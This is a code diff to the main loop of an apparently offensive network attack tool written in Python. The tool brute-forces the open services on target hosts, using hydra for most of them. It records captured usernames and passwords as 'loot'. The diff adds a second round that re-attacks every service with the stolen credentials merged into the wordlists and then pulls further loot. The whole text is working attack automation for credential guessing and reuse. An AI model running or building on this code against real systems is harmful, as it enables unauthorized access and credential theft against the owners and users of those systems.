@@ -59,7 +59,8 @@ def main():
             exploit = exploits[open_service]
             exploit.output = args.output
             exploit.domain = args.domain # mainly important for LDAP
-            print(f"Attacking host {host} on port {exploit.port} using {exploit.name}. This may take a while.",
+            print(f"{Color.MAGEN}Round 1 of attacking host {host} on port {exploit.port} using {exploit.name}.",
+                  f"This may take a while.{Color.END}",
                     file=args.output)
             # TODO use multiprocessing to do this asynchronously
             # hydra for everyone but ldap
@@ -79,29 +80,36 @@ def main():
     print(f"{Color.GRN}Attack completed. Re-attacking services using any stored loot.{Color.END}", file=args.output)
 
     for host in host_openings:
-        found_usernames, found_passwords = zip(*get_logged_loot())
-        found_usernames = [x for x in found_usernames if x]
-        with open('data/usernames_cache.txt', 'w') as f:
-            for username in found_usernames:
-                f.write('%s\n' % username)
-            with open(args.usernames, 'r') as g:
-                for suggested_username in g.readlines():
-                    f.write(suggested_username)
-        found_passwords = [x for x in found_passwords if x]
-        with open('data/passwords_cache.txt', 'w') as f:
-            for passwords in found_passwords:
-                f.write('%s\n' % passwords)
-            with open(args.passwords, 'r') as g:
-                for suggested_password in g.readlines():
-                    f.write(suggested_password)
-        new_loot = exploit.attack(host, 'data/usernames_cache.txt', 'data/passwords_cache.txt')
-        os.remove('data/usernames_cache.txt')
-        os.remove('data/passwords_cache.txt')
-        if new_loot:
-            log_loot(new_loot, args.output)
-            more_loot = exploit.getloot(host, new_loot)
-            if more_loot:
-                log_loot(more_loot, args.output)
+        for open_service in host_openings[host]:
+            exploit = exploits[open_service]
+            found_usernames, found_passwords = zip(*get_logged_loot())
+            found_usernames = [x for x in found_usernames if x]
+            if not found_usernames:
+                return
+            print(f"{Color.MAGEN}Round 2 of attacking host {host} on port {exploit.port} using {exploit.name}.",
+                  f"This may take a while.{Color.END}",
+                    file=args.output)
+            with open('data/usernames_cache.txt', 'w') as f:
+                for username in found_usernames:
+                    f.write('%s\n' % username)
+                with open(args.usernames, 'r') as g:
+                    for suggested_username in g.readlines():
+                        f.write(suggested_username)
+            found_passwords = [x for x in found_passwords if x]
+            with open('data/passwords_cache.txt', 'w') as f:
+                for passwords in found_passwords:
+                    f.write('%s\n' % passwords)
+                with open(args.passwords, 'r') as g:
+                    for suggested_password in g.readlines():
+                        f.write(suggested_password)
+            new_loot = exploit.attack(host, 'data/usernames_cache.txt', 'data/passwords_cache.txt')
+            os.remove('data/usernames_cache.txt')
+            os.remove('data/passwords_cache.txt')
+            if new_loot:
+                log_loot(new_loot, args.output)
+                more_loot = exploit.getloot(host, new_loot)
+                if more_loot:
+                    log_loot(more_loot, args.output)
 
 if __name__=='__main__':
     main()
